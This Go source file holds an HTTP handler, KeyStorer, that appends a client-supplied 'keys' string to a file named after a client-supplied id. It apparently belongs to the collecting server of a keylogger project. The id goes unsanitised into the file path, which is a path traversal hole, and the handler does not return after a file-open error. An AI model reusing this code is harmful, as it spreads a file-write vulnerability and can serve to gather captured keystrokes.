package controllers

import (
	"fmt"
	"net/http"
	"os"

	"encoding/json"
	"io"

	"github.com/victormagalhaess/key-hime/server/pkg/api/status"
)

type Message struct {
	Id   string `json:"id"`
	Keys string `json:"keys"`
}

func KeyStorer(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(r.Body)
	defer r.Body.Close()
	if err != nil {
		status.BadRequest(w, err)
		return
	}

	var message Message
	err = json.Unmarshal(body, &message)
	if err != nil {
		status.BadRequest(w, err)
		return
	}

	f, err := os.OpenFile(fmt.Sprintf("%s.txt", message.Id), os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		status.ServerError(w, err)
	}

	defer f.Close()

	if _, err = f.WriteString(fmt.Sprintf("%s\n", message.Keys)); err != nil {
		status.ServerError(w, err)
	}

	status.Created(w, []byte("Created"))

}
